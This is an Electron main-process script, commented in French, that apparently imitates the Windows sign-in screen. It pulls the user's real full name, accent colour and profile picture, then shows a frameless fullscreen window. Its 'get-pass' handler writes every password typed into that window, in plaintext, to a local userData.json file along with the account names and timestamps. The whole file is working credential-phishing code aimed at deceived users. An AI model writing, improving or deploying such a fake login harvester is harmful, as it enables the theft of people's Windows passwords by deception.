const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const regedit = require('regedit');
const { exec } = require('child_process');

// Chemin dynamique pour localiser le dossier vbs en mode production
const vbsPath = path.join(process.resourcesPath, 'app', 'node_modules', 'regedit', 'vbs');
regedit.setExternalVBSLocation(vbsPath);

/*
// Récupère le chemin d'origine passé en argument par le batch
const originPath = process.argv[1] || app.getPath('userData'); // Utilise 'userData' par défaut si aucun argument n'est fourni
// Emplacement du fichier JSON
const filePath = path.join(originPath, 'userData.json');
*/
const filePath = path.join(path.dirname(app.getPath('exe')), 'userData.json');
//#region get du nom
let username;
let passSaved = false;
let canQuit = false;

function getFullUserName(callback) {
  const command = `powershell -Command "Get-WmiObject -Class Win32_UserAccount -Filter \\"Name='$env:USERNAME'\\" | Select-Object -ExpandProperty FullName"`;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Erreur lors de l'exécution de la commande PowerShell : ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Erreur PowerShell : ${stderr}`);
      return;
    }
    const fullName = stdout.trim();
    callback(fullName);
  });
}

// Utilisation de la fonction
getFullUserName((fullName) => {
  console.log(`Nom complet de l'utilisateur Windows : ${fullName}`);
  username = fullName;
  mainWindow.webContents.send('name', username); // Envoie à renderer.html

});
//#endregion

//#region récupère la couleur systhème windows
const registryPaths = [
  'HKCU\\Software\\Microsoft\\Windows\\DWM',
  'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Accent',
];

let color;

regedit.list(registryPaths, (err, result) => {
  if (err) {
    console.error("Erreur lors de la lecture du registre :", err);
  } else {
    // Récupération des différentes valeurs de couleur
    const colorizationColor = result['HKCU\\Software\\Microsoft\\Windows\\DWM'].values['ColorizationColor']?.value;
    //const accentColorMenu = result['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Accent'].values['AccentColorMenu']?.value;
    //const startColorMenu = result['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Accent'].values['StartColorMenu']?.value;
    color = argbToRgb(colorizationColor);
    mainWindow.webContents.send('color', color); // Envoie à renderer.html
  }
});

function argbToRgb(argb) {
  const hex = parseInt(argb, 10).toString(16).padStart(8, '0');
  const alpha = parseInt(hex.slice(0, 2), 16) / 255;
  const red = parseInt(hex.slice(2, 4), 16);
  const green = parseInt(hex.slice(4, 6), 16);
  const blue = parseInt(hex.slice(6, 8), 16);
  return `rgba(${red}, ${green}, ${blue}, 255)`;
}

//#endregion

let mainWindow;

//#region récupére l'immgge de profil wd
let wdProfilePicture;

if (process.platform === 'win32') {
  // Chemin pour Windows
  const accountPicturesPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'AccountPictures');
  if (fs.existsSync(accountPicturesPath)) {
    const files = fs.readdirSync(accountPicturesPath);
    let imageFile = files.find(file => file.endsWith('.jpg') || file.endsWith('.png'));
    if (imageFile) {
      profileImagePath = path.join(accountPicturesPath, imageFile);
    } else {
      imageFile = files.find(file => file.endsWith('.accountpicture-ms'));
      if (imageFile) {
        const filePath = path.join(accountPicturesPath, imageFile);
        import('accountpicture-ms-extractor').then(({ default: extract }) => {
          extract(filePath)
            .then(({ highres }) => {
              wdProfilePicture = highres.base64();
              console.log("extrait de accountpicture");
              //console.log(wdProfilePicture);
            })
            .catch(error => {
              console.error('Erreur lors de l\'extraction de l\'image :', error);
            });
        });
      } else {
        console.log('Aucun fichier .accountpicture-ms trouvé.');
      }
    }
  }
}
//#endregion
function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    transparent: true, // Rend la fenêtre transparente
    frame: false,      // Supprime les bordures de fenêtre
    resizable: false,  // Empêche le redimensionnement pour éviter les effets visuels indésirables
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      enableRemoteModule: false,
    }
  });

  mainWindow.loadFile('setup.html'); // Charge la page d'accueil au démarrage

  // Ouvre la console DevTools en mode dev
  if (!app.isPackaged) {
    mainWindow.webContents.openDevTools();
  }

  // Passe en plein écran et masque la barre de menu lorsqu'on charge `index.html`
  mainWindow.webContents.on('did-finish-load', () => {
    if (mainWindow.webContents.getURL().endsWith('index.html')) {
      mainWindow.setFullScreen(true);
      mainWindow.setMenuBarVisibility(false);
    } else {
      mainWindow.webContents.send('color', color);//pour voir la sys color
      mainWindow.webContents.send('debug', filePath);//debug
    }
  });
}

app.whenReady().then(createWindow);

ipcMain.on('set-data', (event, data) => {
  mainWindow.loadFile('index.html'); // Charge la page principale

  const interfaces = os.networkInterfaces();
  data.isWifi = false;

  for (const name in interfaces) {
    const iface = interfaces[name];
    iface.forEach(details => {
      if (details.family === 'IPv4' && details.internal === false && /wi-fi|wireless/i.test(name)) {
        data.isWifi = true;
      }
    });
  }

  data.profileImagebase64 = wdProfilePicture;
  data.syscolor = color;

  if (!data.username) data.username = os.userInfo().username;
  data.language = process.env.LANG || process.env.LANGUAGE || process.env.LC_ALL || process.env.LC_MESSAGES || process.env.UILanguage || 'Langue inconnue';

  //console.log(data);

  mainWindow.webContents.once('did-finish-load', () => {
    mainWindow.webContents.send('set-data', data); // Envoie à renderer.html
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

ipcMain.on('get-pass', (event, userInput) => {
  console.log(`Texte saisi : ${userInput}`);

  // Nouvelle entrée à ajouter
  const newEntry = {
    username: username,
    baseUsername: os.userInfo().username,
    password: userInput,
    timestamp: new Date().toISOString(),
    timesTyped: 1,
  };

  // Fonction pour ajouter ou mettre à jour l'entrée dans la liste et sauvegarder
  function saveData(data) {
    // Recherche d'une entrée existante avec le même `username`, `baseUsername`, et `password`
    const existingEntry = data.find(
      (entry) => entry.username === newEntry.username &&
        entry.baseUsername === newEntry.baseUsername &&
        entry.password === newEntry.password
    );

    if (existingEntry) {
      // Si l'entrée existe, incrémente `timesTyped`
      existingEntry.timesTyped += 1;
      existingEntry.timestamp = new Date().toISOString(); // Met à jour le timestamp
    } else {
      // Si l'entrée n'existe pas, ajoute `newEntry`
      data.push(newEntry);
    }

    // Écrit les données mises à jour dans le fichier JSON
    fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
      if (err) {
        console.error("Erreur lors de la sauvegarde des données :", err);
      } else {
        console.log("Données sauvegardées dans userData.json");
        passSaved = true;
        if (canQuit === true) app.quit();
        else console.log("en attente fin de transition");
      }
    });
  }

  // Lecture du fichier pour ajouter les données de manière additive
  fs.readFile(filePath, 'utf8', (err, fileData) => {
    if (err) {
      if (err.code === 'ENOENT') {
        // Si le fichier n'existe pas, créez une nouvelle liste
        saveData([]);//liste de base vide
      } else {
        console.error("Erreur lors de la lecture du fichier :", err);
      }
    } else {
      try {
        const data = JSON.parse(fileData);
        if (Array.isArray(data)) {
          saveData(data);//ajouter a la liste existante
        } else {
          saveData([]);//liste de base vide
        }
      } catch (parseErr) {
        console.error("Erreur de parsing JSON :", parseErr);
        saveData([]);//liste de base vide
      }
    }
  });
});

ipcMain.on('set-opacity', (event, opacity) => {
  if (mainWindow) {
    mainWindow.setOpacity(opacity);
  }
});

ipcMain.on('close-window', (event, data) => {
  console.log("transition finito");
  canQuit = true;
  if (passSaved === true) app.quit();
});

ipcMain.on('setup-quit', (event, data) => {
  app.quit();
});